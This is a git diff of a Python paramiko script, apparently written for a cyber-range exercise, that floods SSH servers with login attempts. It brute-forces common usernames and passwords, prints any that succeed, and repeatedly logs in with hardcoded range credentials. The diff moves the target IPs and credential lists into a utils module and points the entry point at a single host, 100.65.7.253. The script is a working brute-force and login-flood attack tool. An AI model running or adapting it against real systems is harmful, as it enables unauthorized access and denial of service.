@@ -1,13 +1,13 @@
+import sys
+from pathlib import Path
+
+sys.path.append(str(Path(__file__).parent.parent))
+
 import paramiko
 import threading
 import random
 import time
-
-LINUX_TARGET_IPS = ["10.10.10.101", "10.10.10.102", "10.10.10.103", "10.10.10.104"]
-WINDOWS_TARGET_IPS = ["10.10.10.21", "10.10.10.22", "10.10.10.23"]
-
-usernames = ["admin", "root"]
-passwords = ["password", "12345", "root", "toor", "admin", "snake"]
+from utils import usernames, passwords, LINUX_TARGET_IPS, WINDOWS_TARGET_IPS
 
 def correct_login_flood_work(target_host, username, password):
     while True:
@@ -36,6 +36,8 @@ def incorrect_login_flood_work(target_host):
             print(f"SUCCESS: {u}:{p}")
         except paramiko.AuthenticationException:
             pass
+        except:
+            ...
         ssh.close()
         time.sleep(random.randrange(30)/1000)
 
@@ -54,6 +56,10 @@ def main():
         linux_login_threads.append(correct_login_flood(ip, "cyberrange", "Cyberrange123!"))
     for ip in WINDOWS_TARGET_IPS:
         windows_login_threads.append(correct_login_flood(ip, "sjohnson", "UwU?OwO!67")) # ask greyteam for correct creds
+    print("Flooding...")
+    input("Press Enter to quit:")
 
 if __name__ == "__main__":
-    main()
+    # main()
+    t = incorrect_login_flood("100.65.7.253")
+    input()
